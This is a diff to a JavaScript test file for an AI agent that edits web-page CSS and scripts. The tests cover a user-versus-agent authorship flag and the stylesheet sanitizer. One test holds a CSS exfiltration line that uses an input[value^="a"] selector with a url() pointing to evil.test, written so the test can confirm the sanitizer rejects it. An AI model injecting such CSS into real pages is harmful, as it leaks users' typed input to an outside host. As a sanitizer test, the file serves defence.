@@ -569,6 +569,7 @@ test('apply_css in a CSS-only run inserts withMarker(css, id) in place of the ea
     insertedText: withMarker(css, 'applied-1'),
     appliedId: 'applied-1',
     url: 'https://site.test/videos/1',
+    cssByUser: false,
   }]);
 });
 
@@ -600,6 +601,57 @@ test('apply_css after a run started with a script keeps the script in the applie
   assert.deepEqual(page.userScripts, [], 'a CSS change neither undoes nor re-runs the script');
 });
 
+test('the user\'s CSS keeps its flag through an apply_script and loses it with the agent\'s apply_css', async () =>
+{
+  const page = new FakePage(TAB_A);
+  const userCss = '@import url("https://fonts.test/inter.css"); body { font-family: var(--font, Inter); }';
+  const agentCss = 'main { color: red !important; }';
+  const script = 'agent.on(document, "keydown", () => undefined);';
+  const client = new ScriptedClient([
+    respond(
+      setConditions('c1'),
+      call('apply_script', { code: script }),
+      call('apply_css', { css: agentCss }),
+      call('apply_script', { code: `${script}\nagent.onUndo(() => undefined);` }),
+    ),
+    answer('I stop here.'),
+  ]);
+  const { run, listener } = startRun(client, page, {
+    scripts: true,
+    currentCss: userCss,
+    currentCssByUser: true,
+    insertedText: withMarker(userCss, 'user-id'),
+  });
+
+  await run.run();
+
+  assert.deepEqual(listener.applied.map(applied => [applied.css, applied.cssByUser]), [
+    [userCss, true],
+    [agentCss, false],
+    [agentCss, false],
+  ]);
+});
+
+test('the first message says the current stylesheet was written by the user only when it was', async () =>
+{
+  const css = 'body { background: url("https://images.test/bg.png"); }';
+  const firstMessage = async cssByUser =>
+  {
+    const client = new ScriptedClient([answer('ok')]);
+    const { run } = startRun(client, new FakePage(TAB_A), { currentCss: css, currentCssByUser: cssByUser });
+    await run.run();
+    return client.requests[0].messages.find(message => message.role === 'user').content;
+  };
+
+  const byUser = await firstMessage(true);
+  const byAgent = await firstMessage(false);
+
+  assert.match(byUser, /Current stylesheet \(written by the user; .*apply_css refuses/);
+  assert.ok(byUser.includes(css));
+  assert.doesNotMatch(byAgent, /written by the user/);
+  assert.ok(byAgent.includes(css));
+});
+
 test('a stylesheet the sanitizer rejects goes back to the model and nothing is inserted', async () =>
 {
   const page = new FakePage(TAB_A);
@@ -617,6 +669,28 @@ test('a stylesheet the sanitizer rejects goes back to the model and nothing is i
   const toolResults = client.toolResults(1);
   assert.equal(toolResults.length, 2);
   assert.match(toolResults[1].content, /rejected: url\(\)/);
+  assert.deepEqual(page.inserted, []);
+  assert.deepEqual(page.removed, []);
+  assert.deepEqual(listener.applied, []);
+});
+
+test('the agent\'s apply_css is sanitized even when the run starts on CSS the user wrote', async () =>
+{
+  const page = new FakePage(TAB_A);
+  const userCss = 'body { background: url("https://images.test/bg.png"); }';
+  const userText = withMarker(userCss, 'user-id');
+  const client = new ScriptedClient([
+    respond(
+      setConditions('c1'),
+      call('apply_css', { css: `${userCss}\ninput[value^="a"] { background: url(https://evil.test/a) !important; }` }),
+    ),
+    answer('I stop here.'),
+  ]);
+  const { run, listener } = startRun(client, page, { currentCss: userCss, currentCssByUser: true, insertedText: userText });
+
+  await run.run();
+
+  assert.match(client.toolResults(1)[1].content, /rejected: url\(\)/);
   assert.deepEqual(page.inserted, []);
   assert.deepEqual(page.removed, []);
   assert.deepEqual(listener.applied, []);
